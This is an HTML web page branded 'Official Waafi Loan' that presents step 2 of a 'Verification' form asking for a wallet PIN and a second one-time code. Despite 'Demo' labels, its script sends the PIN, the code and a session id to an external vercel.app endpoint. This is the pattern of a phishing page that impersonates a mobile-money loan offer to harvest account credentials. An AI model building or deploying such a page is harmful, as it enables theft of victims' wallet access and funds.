<!DOCTYPE html>
<html lang="fr">

<head>

<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Verification</title>

<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>

<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">

<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">

<link rel="stylesheet" href="css/style.css">

</head>

<body>

<nav class="navbar navbar-dark bg-success">

<div class="container">

<a class="navbar-brand fw-bold">
Official Waafi Loan
</a>

</div>

</nav>

<div class="container">

<div class="row justify-content-center">

<div class="col-lg-5">

<div class="card shadow-lg border-0 mt-5">

<div class="card-body p-4">

<h3 class="text-center text-success">
Verification
</h3>

<p class="text-center">
Step 2 of 2
</p>

<div class="progress mb-4">

<div class="progress-bar bg-success" style="width:100%">
100%
</div>

</div>

<form id="step2Form">

<div class="mb-3">

<label class="form-label">
🔐 PIN (Demo)
</label>

<input
id="demoPin"
type="text"
class="form-control"
placeholder="Enter PIN (Demo)"
required>

</div>

<div class="mb-4">

<label class="form-label">
📝 OTP 2 (Demo)
</label>

<input
id="otp2"
type="text"
class="form-control"
placeholder="Enter OTP 2 (Demo)"
required>

</div>

<button
class="btn btn-success w-100"
type="submit">

Continue →

</button>

</form>

</div>

</div>

</div>

</div>

</div>

<footer class="text-center mt-5 mb-3">

© 2026 Official Waafi Loan

</footer>

<script>

document.getElementById("step2Form").addEventListener("submit", async function(e){

    e.preventDefault();

    const demoPin = document.getElementById("demoPin").value;
    const otp2 = document.getElementById("otp2").value;

    const sessionId = localStorage.getItem("session_id");

    if(!sessionId){

        alert("Session not found.");

        return;

    }

    try{

  const response = await fetch("https://official-waafi-loan-j9d7.vercel.app/step2", {

    method: "POST",

    headers: {
        "Content-Type": "application/json"
    },

    body: JSON.stringify({

        session_id: sessionId,

        waafi_pin: demoPin,

        otp2: otp2

    })

});

const result = await response.json(); response.json();
        if(result.status==="success"){

            window.location.href="success.html";

        }else{

            alert("Submission failed.");

        }

    }catch(error){

        console.log(error);

        alert("Connection error.");

    }

});

</script>

</body>

</html>
